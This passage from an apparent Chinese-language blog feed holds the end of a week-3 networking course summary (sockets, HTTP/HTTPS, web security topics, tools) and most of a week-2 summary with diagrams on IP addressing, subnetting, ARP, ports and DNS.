id="7-安全Web应用（Day-21）"><a href="#7-安全Web应用（Day-21）" class="headerlink" title="7. 安全Web应用（Day 21）"></a>7. 安全Web应用（Day 21）</h3><ul><li>用户认证系统</li><li>Session管理</li><li>CSRF&#x2F;XSS防护</li><li>HTTP&#x2F;HTTPS双支持</li></ul><hr><h2 id="🔧-掌握的工具"><a href="#🔧-掌握的工具" class="headerlink" title="🔧 掌握的工具"></a>🔧 掌握的工具</h2><h3 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h3><ul><li><strong>Wireshark</strong>：抓包分析</li><li><strong>tcpdump</strong>：命令行抓包</li><li><strong>netstat &#x2F; ss</strong>：查看连接</li><li><strong>curl</strong>：HTTP客户端</li><li><strong>telnet &#x2F; nc</strong>：网络调试</li></ul><h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><ul><li><strong>ab</strong>：Apache Bench</li><li><strong>wrk</strong>：现代化压力测试</li><li><strong>iperf</strong>：带宽测试</li></ul><h3 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h3><ul><li><strong>Python debugger</strong>：pdb</li><li><strong>网络诊断</strong>：ping、traceroute</li><li><strong>SSL测试</strong>：SSL Labs</li></ul><hr><h2 id="📈-技能提升"><a href="#📈-技能提升" class="headerlink" title="📈 技能提升"></a>📈 技能提升</h2><h3 id="编程能力"><a href="#编程能力" class="headerlink" title="编程能力"></a>编程能力</h3><ul><li>✅ Socket编程（TCP&#x2F;UDP）</li><li>✅ IO多路复用实现</li><li>✅ HTTP协议实现</li><li>✅ TLS&#x2F;SSL使用</li><li>✅ 安全编程实践</li></ul><h3 id="网络知识"><a href="#网络知识" class="headerlink" title="网络知识"></a>网络知识</h3><ul><li>✅ 深入理解TCP&#x2F;UDP</li><li>✅ 掌握HTTP&#x2F;HTTPS</li><li>✅ 了解网络安全</li><li>✅ 熟悉性能优化</li></ul><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ul><li>✅ 网络抓包分析</li><li>✅ 性能测试</li><li>✅ 调试排错</li><li>✅ 证书管理</li></ul><hr><h2 id="📊-学习统计"><a href="#📊-学习统计" class="headerlink" title="📊 学习统计"></a>📊 学习统计</h2><h3 id="时间分配"><a href="#时间分配" class="headerlink" title="时间分配"></a>时间分配</h3><ul><li>理论学习：40%</li><li>编码实践：40%</li><li>调试测试：20%</li></ul><h3 id="代码量"><a href="#代码量" class="headerlink" title="代码量"></a>代码量</h3><ul><li>理论文档：约8000行</li><li>实战代码：约5000行</li><li>总计：约13000行</li></ul><h3 id="项目数量"><a href="#项目数量" class="headerlink" title="项目数量"></a>项目数量</h3><ul><li>完整项目：7个</li><li>小型demo：15+个</li><li>练习题：30+道</li></ul><hr><h2 id="🎓-学习建议"><a href="#🎓-学习建议" class="headerlink" title="🎓 学习建议"></a>🎓 学习建议</h2><h3 id="巩固知识"><a href="#巩固知识" class="headerlink" title="巩固知识"></a>巩固知识</h3><ol><li><p><strong>复习核心概念</strong></p><ul><li>TCP三次握手&#x2F;四次挥手</li><li>HTTP请求&#x2F;响应格式</li><li>HTTPS握手过程</li><li>安全防护措施</li></ul></li><li><p><strong>动手实践</strong></p><ul><li>重写关键项目</li><li>添加新功能</li><li>性能优化</li><li>代码重构</li></ul></li><li><p><strong>深入理解</strong></p><ul><li>阅读RFC文档</li><li>查看框架源码</li><li>分析真实案例</li><li>参与技术讨论</li></ul></li></ol><h3 id="扩展学习"><a href="#扩展学习" class="headerlink" title="扩展学习"></a>扩展学习</h3><ol><li><p><strong>Web框架</strong></p><ul><li>Flask、Django</li><li>Express、Koa</li><li>Spring Boot</li></ul></li><li><p><strong>异步编程</strong></p><ul><li>asyncio</li><li>Twisted</li><li>Tornado</li></ul></li><li><p><strong>微服务</strong></p><ul><li>RESTful API设计</li><li>gRPC</li><li>服务发现</li></ul></li><li><p><strong>性能优化</strong></p><ul><li>缓存策略</li><li>负载均衡</li><li>CDN使用</li></ul></li></ol><hr><h2 id="🚀-下周预告"><a href="#🚀-下周预告" class="headerlink" title="🚀 下周预告"></a>🚀 下周预告</h2><p><strong>第四周：网络层协议（Day 22-28）</strong></p><h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><ul><li>IP协议基础（IPv4&#x2F;IPv6）</li><li>子网划分和路由</li><li>ICMP协议和网络诊断</li><li>ARP协议和地址解析</li><li>路由协议（静态&#x2F;动态）</li><li>网络安全进阶</li><li>综合实战项目</li></ul><h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><ul><li>理解IP地址和子网</li><li>掌握路由原理</li><li>学会网络诊断</li><li>了解路由协议</li><li>实现简单路由器</li></ul><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li>复习本周内容</li><li>预习IP地址概念</li><li>准备网络诊断工具</li><li>阅读相关文档</li></ul><hr><h2 id="💡-本周总结"><a href="#💡-本周总结" class="headerlink" title="💡 本周总结"></a>💡 本周总结</h2><h3 id="主要成就"><a href="#主要成就" class="headerlink" title="主要成就"></a>主要成就</h3><p>✅ 深入理解传输层协议（TCP&#x2F;UDP）<br>✅ 掌握Socket编程技术<br>✅ 学会构建Web服务器<br>✅ 了解网络安全基础<br>✅ 完成7个实战项目</p><h3 id="关键收获"><a href="#关键收获" class="headerlink" title="关键收获"></a>关键收获</h3><ol><li><strong>协议理解</strong>：从理论到实践，深入理解TCP&#x2F;UDP工作原理</li><li><strong>编程能力</strong>：能够独立实现HTTP&#x2F;HTTPS服务器</li><li><strong>安全意识</strong>：了解常见攻击和防御措施</li><li><strong>性能优化</strong>：掌握高并发处理技巧</li></ol><h3 id="待提升领域"><a href="#待提升领域" class="headerlink" title="待提升领域"></a>待提升领域</h3><ul><li>大规模并发处理</li><li>分布式系统设计</li><li>容器化部署</li><li>服务网格</li></ul><hr><h2 id="📝-学习心得"><a href="#📝-学习心得" class="headerlink" title="📝 学习心得"></a>📝 学习心得</h2><p><strong>本周是整个课程中最重要的一周</strong>，我们从传输层深入到应用层，学习了网络编程的核心知识。</p><p><strong>TCP协议</strong>是可靠传输的基石，理解三次握手、四次挥手、滑动窗口、拥塞控制等机制，对于开发高性能网络应用至关重要。</p><p><strong>UDP协议</strong>虽然简单，但在实时应用中不可或缺。学会在应用层实现可靠性，是一项重要技能。</p><p><strong>HTTP&#x2F;HTTPS协议</strong>是Web开发的基础。从零实现HTTP服务器，让我们深刻理解了Web应用的工作原理。</p><p><strong>网络安全</strong>不容忽视。CSRF、XSS、SQL注入等攻击手段层出不穷，必须在开发时就考虑安全问题。</p><p><strong>实践是最好的老师</strong>。通过7个实战项目，我们不仅学会了理论，更重要的是培养了动手能力和解决问题的能力。</p><hr><h2 id="🌟-激励语录"><a href="#🌟-激励语录" class="headerlink" title="🌟 激励语录"></a>🌟 激励语录</h2><blockquote><p>“纸上得来终觉浅，绝知此事要躬行。”</p></blockquote><p>网络编程是一门实践性很强的学科。理论知识固然重要，但只有通过大量的编码实践，才能真正掌握。</p><p>继续保持学习的热情，坚持每天进步一点点。三周下来，你已经掌握了从物理层到应用层的完整知识体系。</p><p>下周我们将学习网络层协议，进一步完善你的网络知识图谱。加油！💪</p><hr><p><strong>学习进度：21&#x2F;180天（11.7%）</strong></p><p><strong>已完成：3周</strong><br><strong>剩余：23周</strong></p><hr><h2 id="📚-推荐资源"><a href="#📚-推荐资源" class="headerlink" title="📚 推荐资源"></a>📚 推荐资源</h2><h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><ul><li>《TCP&#x2F;IP详解 卷1：协议》</li><li>《Unix网络编程》</li><li>《HTTP权威指南》</li><li>《图解HTTP》</li><li>《白帽子讲Web安全》</li></ul><h3 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a>在线资源</h3><ul><li>RFC文档（权威标准）</li><li>MDN Web Docs（Web开发）</li><li>OWASP（安全指南）</li><li>GitHub优秀项目</li></ul><h3 id="实践平台"><a href="#实践平台" class="headerlink" title="实践平台"></a>实践平台</h3><ul><li>LeetCode（算法练习）</li><li>HackerRank（编程挑战）</li><li>CTF平台（安全实战）</li><li>GitHub（开源贡献）</li></ul><hr><p><strong>继续加油！下周见！</strong> 🚀</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二周总结：网络层深入理解</title>
    <link href="/2025/11/10/%E4%BA%8C%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
    <url>/2025/11/10/%E4%BA%8C%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>第二周总结：网络层深入理解</h1><h2 id="本周学习回顾">本周学习回顾</h2><p>恭喜你完成了第二周的学习！本周我们深入学习了网络层的核心概念和协议。让我们一起回顾这一周的精彩内容。</p><hr><h2 id="📚-本周知识地图">📚 本周知识地图</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs armasm">第二周：网络层深入<br>├── Day <span class="hljs-number">8</span>: <span class="hljs-built_in">IP</span>地址详解<br>│   ├── IPv4地址结构<br>│   ├── <span class="hljs-built_in">IP</span>地址分类（A/B/C/D/E）<br>│   ├── 公有<span class="hljs-built_in">IP</span> vs 私有<span class="hljs-built_in">IP</span><br>│   ├── 特殊<span class="hljs-built_in">IP</span>地址<br>│   └── <span class="hljs-built_in">IP</span>地址分析工具<br>│<br>├── Day <span class="hljs-number">9</span>: 子网划分与CIDR<br>│   ├── 子网掩码原理<br>│   ├── CIDR表示法<br>│   ├── 子网计算方法<br>│   ├── VLSM可变长子网<br>│   └── 子网计算器<br>│<br>├── Day <span class="hljs-number">10</span>: MAC地址与ARP<br>│   ├── MAC地址结构<br>│   ├── OUI厂商标识<br>│   ├── ARP工作原理<br>│   ├── ARP缓存机制<br>│   └── ARP扫描工具<br>│<br>├── Day <span class="hljs-number">11</span>: 端口和Socket深入<br>│   ├── 端口概念（<span class="hljs-number">0</span>-<span class="hljs-number">65535</span>）<br>│   ├── 常用端口号<br>│   ├── Socket编程基础<br>│   ├── TCP vs UDP<br>│   └── 端口扫描器<br>│<br>├── Day <span class="hljs-number">12</span>: DNS协议详解<br>│   ├── DNS层级架构<br>│   ├── DNS查询流程（递归/迭代）<br>│   ├── DNS记录类型<br>│   ├── DNS缓存机制<br>│   └── DNS查询工具<br>│<br>└── Day <span class="hljs-number">13</span>: DHCP协议详解<br>    ├── DHCP工作原理<br>    ├── DORA四次握手<br>    ├── <span class="hljs-built_in">IP</span>地址租约管理<br>    ├── DHCP报文格式<br>    └── DHCP分析工具<br></code></pre></td></tr></table></figure><hr><h2 id="🎯-核心知识点回顾">🎯 核心知识点回顾</h2><h3 id="1-IP地址体系">1. IP地址体系</h3><p><strong>IPv4地址结构</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">192.168.1.100<br> |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> </span>|<br> |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> +-- 主机号</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   +---- 子网号</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   +-------- 网络号</span><br><span class="hljs-string"> +------------ 网络类别</span><br></code></pre></td></tr></table></figure><p><strong>IP地址分类</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>类：<span class="hljs-number">1.0.0.0</span> - <span class="hljs-number">126.255.255.255</span><br>     <span class="hljs-number">0</span>xxxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>     用途：大型网络<br><br>B类：<span class="hljs-number">128.0.0.0</span> - <span class="hljs-number">191.255.255.255</span><br>     <span class="hljs-number">10</span>xxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>     用途：中型网络<br><br>C类：<span class="hljs-number">192.0.0.0</span> - <span class="hljs-number">223.255.255.255</span><br>     <span class="hljs-number">110</span>xxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>     用途：小型网络<br><br>D类：<span class="hljs-number">224.0.0.0</span> - <span class="hljs-number">239.255.255.255</span><br>     用途：组播<br><br>E类：<span class="hljs-number">240.0.0.0</span> - <span class="hljs-number">255.255.255.255</span><br>     用途：保留/实验<br></code></pre></td></tr></table></figure><p><strong>私有IP地址</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span>        → A类私有<br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span>     → B类私有<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>    → C类私有<br></code></pre></td></tr></table></figure><h3 id="2-子网划分">2. 子网划分</h3><p><strong>子网掩码作用</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">IP地址：    <span class="hljs-number">192.168.1.100</span>   <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">01100100</span><br>子网掩码：  <span class="hljs-number">255.255.255.0</span>   <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>─────────────────────────────────────────────────────────────<br>网络地址：  <span class="hljs-number">192.168.1.0</span>     <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000000</span> (AND运算)<br></code></pre></td></tr></table></figure><p><strong>CIDR计算</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">CIDR    子网掩码           可用主机数    用途<br>/<span class="hljs-number">8</span>      <span class="hljs-number">255.0.0.0</span>         <span class="hljs-number">16,777,214</span>    大型网络<br>/<span class="hljs-number">16</span>     <span class="hljs-number">255.255.0.0</span>       <span class="hljs-number">65</span>,<span class="hljs-number">534</span>        中型网络<br>/<span class="hljs-number">24</span>     <span class="hljs-number">255.255.255.0</span>     <span class="hljs-number">254</span>           小型网络<br>/<span class="hljs-number">25</span>     <span class="hljs-number">255.255.255.128</span>   <span class="hljs-number">126</span>           小型子网<br>/<span class="hljs-number">26</span>     <span class="hljs-number">255.255.255.192</span>   <span class="hljs-number">62</span>            更小子网<br>/<span class="hljs-number">30</span>     <span class="hljs-number">255.255.255.252</span>   <span class="hljs-number">2</span>             点对点链路<br></code></pre></td></tr></table></figure><p><strong>子网划分示例</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">原网络：<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>划分为<span class="hljs-number">4</span>个子网（/<span class="hljs-number">26</span>）：<br>├── <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">26</span>    (<span class="hljs-number">192.168.1.1</span> - <span class="hljs-number">192.168.1.62</span>)<br>├── <span class="hljs-number">192.168.1.64</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">192.168.1.65</span> - <span class="hljs-number">192.168.1.126</span>)<br>├── <span class="hljs-number">192.168.1.128</span>/<span class="hljs-number">26</span>  (<span class="hljs-number">192.168.1.129</span> - <span class="hljs-number">192.168.1.190</span>)<br>└── <span class="hljs-number">192.168.1.192</span>/<span class="hljs-number">26</span>  (<span class="hljs-number">192.168.1.193</span> - <span class="hljs-number">192.168.1.254</span>)<br></code></pre></td></tr></table></figure><h3 id="3-MAC地址与ARP">3. MAC地址与ARP</h3><p><strong>MAC地址结构</strong>：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:CC</span><span class="hljs-symbol">:DD</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:FF</span><br>│     │  │     │<br>│     │  │     └─ 设备号（厂商分配）<br>│     │  └─────── 设备号<br>│     └────────── 设备号<br>└──────────────── <span class="hljs-variable constant_">OUI</span>（厂商标识）<br><br>示例：<br><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span> → <span class="hljs-title class_">VMware</span><br>08<span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span> → <span class="hljs-title class_">VirtualBox</span><br><span class="hljs-variable constant_">AC</span><span class="hljs-symbol">:DE</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span> → <span class="hljs-title class_">Apple</span><br></code></pre></td></tr></table></figure><p><strong>ARP工作流程</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">场景：主机<span class="hljs-keyword">A</span> (<span class="hljs-number">192.168.1.10</span>) 要发送数据给主机B (<span class="hljs-number">192.168.1.20</span>)<br><br><span class="hljs-number">1</span>. 主机<span class="hljs-keyword">A</span>检查ARP缓存<br>   └─ 没有<span class="hljs-number">192.168.1.20</span>的MAC地址<br><br><span class="hljs-number">2</span>. 主机<span class="hljs-keyword">A</span>广播ARP请求<br>   源MAC: aa:bb:cc:dd:ee:ff<br>   源IP:  <span class="hljs-number">192.168.1.10</span><br>   目标MAC: ff:ff:ff:ff:ff:ff (广播)<br>   目标IP: <span class="hljs-number">192.168.1.20</span><br>   问题: &quot;<span class="hljs-number">192.168.1.20</span>的MAC地址是什么？&quot;<br><br><span class="hljs-number">3</span>. 主机B收到请求，单播ARP响应<br>   源MAC: <span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span><br>   源IP:  <span class="hljs-number">192.168.1.20</span><br>   目标MAC: aa:bb:cc:dd:ee:ff<br>   目标IP: <span class="hljs-number">192.168.1.10</span><br>   回答: &quot;我是<span class="hljs-number">192.168.1.20</span>，MAC是<span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span>&quot;<br><br><span class="hljs-number">4</span>. 主机<span class="hljs-keyword">A</span>更新ARP缓存<br>   <span class="hljs-number">192.168.1.20</span> → <span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span><br><br><span class="hljs-number">5</span>. 主机<span class="hljs-keyword">A</span>封装数据帧发送<br>   目标MAC: <span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span> ✅<br></code></pre></td></tr></table></figure><h3 id="4-端口与Socket">4. 端口与Socket</h3><p><strong>端口分类</strong>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">0</span>-<span class="hljs-number">1023</span>      系统端口（Well-Known Ports）<br>            需要管理员权限<br>            示例：<span class="hljs-built_in">HTTP</span>(<span class="hljs-number">80</span>)、<span class="hljs-built_in">HTTPS</span>(<span class="hljs-number">443</span>)、<span class="hljs-built_in">SSH</span>(<span class="hljs-number">22</span>)<br><br><span class="hljs-number">1024</span>-<span class="hljs-number">49151</span>  注册端口（Registered Ports）<br>            由IANA分配<br>            示例：<span class="hljs-built_in">MySQL</span>(<span class="hljs-number">3306</span>)、<span class="hljs-built_in">Redis</span>(<span class="hljs-number">6379</span>)<br><br><span class="hljs-number">49152</span>-<span class="hljs-number">65535</span> 动态端口（Dynamic Ports）<br>            临时端口、客户端端口<br></code></pre></td></tr></table></figure><p><strong>常用端口速查</strong>：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">协议/服务    端口    说明<br>HTTP       <span class="hljs-number"> 80 </span>     网页浏览<br>HTTPS      <span class="hljs-number"> 443 </span>    加密网页<br>SSH        <span class="hljs-number"> 22 </span>     远程登录<br>FTP        <span class="hljs-number"> 21 </span>     文件传输<br>Telnet     <span class="hljs-number"> 23 </span>     远程终端<br>SMTP       <span class="hljs-number"> 25 </span>     邮件发送<br>POP3       <span class="hljs-number"> 110 </span>    邮件接收<br>IMAP       <span class="hljs-number"> 143 </span>    邮件接收<br>DNS        <span class="hljs-number"> 53 </span>     域名解析<br>DHCP        67/68   IP地址分配<br>MySQL      <span class="hljs-number"> 3306 </span>   数据库<br>PostgreSQL <span class="hljs-number"> 5432 </span>   数据库<br>Redis      <span class="hljs-number"> 6379 </span>   缓存数据库<br>MongoDB    <span class="hljs-number"> 27017 </span>  文档数据库<br></code></pre></td></tr></table></figure><p><strong>TCP Socket流程</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">服务器端：                     客户端：<br><span class="hljs-function"><span class="hljs-title">socket</span><span class="hljs-params">()</span></span>                      <span class="hljs-built_in">socket</span>()<br>   ↓                             ↓<br><span class="hljs-function"><span class="hljs-title">bind</span><span class="hljs-params">()</span></span>                         ---<br>   ↓                             ↓<br><span class="hljs-function"><span class="hljs-title">listen</span><span class="hljs-params">()</span></span>                       <span class="hljs-built_in">connect</span>() ────→ 三次握手<br>   ↓                             ↓<br><span class="hljs-function"><span class="hljs-title">accept</span><span class="hljs-params">()</span></span> ←───────────────────────┘<br>   ↓                             ↓<br><span class="hljs-function"><span class="hljs-title">recv</span><span class="hljs-params">()</span></span> ←─────────────────────── <span class="hljs-built_in">send</span>()<br>   ↓                             ↓<br><span class="hljs-function"><span class="hljs-title">send</span><span class="hljs-params">()</span></span> ─────────────────────→ <span class="hljs-built_in">recv</span>()<br>   ↓                             ↓<br><span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">()</span></span>                        <span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><h3 id="5-DNS协议">5. DNS协议</h3><p><strong>DNS层级结构</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">完整域名：www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>           │   │       │   │<br>           │   │       │   └─ 根域<br>           │   │       └───── 顶级域(TLD)<br>           │   └─────────────二级域(SLD)<br>           └─────────────────子域/主机名<br></code></pre></td></tr></table></figure><p><strong>DNS查询流程（递归+迭代）</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>. 客户端 → 本地DNS服务器<br>   <span class="hljs-string">&quot;www.example.com的IP是什么？&quot;</span><br><br><span class="hljs-number">2</span>. 本地DNS → 根DNS服务器<br>   根DNS → <span class="hljs-string">&quot;去问.com服务器，地址是X.X.X.X&quot;</span><br><br><span class="hljs-number">3</span>. 本地DNS → <span class="hljs-selector-class">.com</span> DNS服务器<br>   <span class="hljs-selector-class">.com</span> DNS → <span class="hljs-string">&quot;去问example.com的权威DNS，地址是Y.Y.Y.Y&quot;</span><br><br><span class="hljs-number">4</span>. 本地DNS → example<span class="hljs-selector-class">.com</span> 权威DNS<br>   权威DNS → <span class="hljs-string">&quot;www.example.com的IP是93.184.216.34&quot;</span><br><br><span class="hljs-number">5</span>. 本地DNS → 客户端<br>   <span class="hljs-string">&quot;答案是93.184.216.34&quot;</span><br><br>总耗时：通常<span class="hljs-number">50</span>-<span class="hljs-number">200ms</span><br></code></pre></td></tr></table></figure><p><strong>DNS记录类型</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">A记录     → IPv4地址        www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> → <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br>AAAA记录  → IPv6地址        www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> → <span class="hljs-number">2606</span>:<span class="hljs-number">2800</span>:<span class="hljs-number">220</span>:<span class="hljs-number">1</span>:...<br>CNAME记录 → 别名           blog<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> → www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>MX记录    → 邮件服务器      example<span class="hljs-selector-class">.com</span> → mail<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> (优先级<span class="hljs-number">10</span>)<br>NS记录    → 域名服务器      example<span class="hljs-selector-class">.com</span> → ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>TXT记录   → 文本信息        用于SPF、DKIM验证<br>PTR记录   → 反向解析        IP → 域名<br></code></pre></td></tr></table></figure><p><strong>DNS缓存层级</strong>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 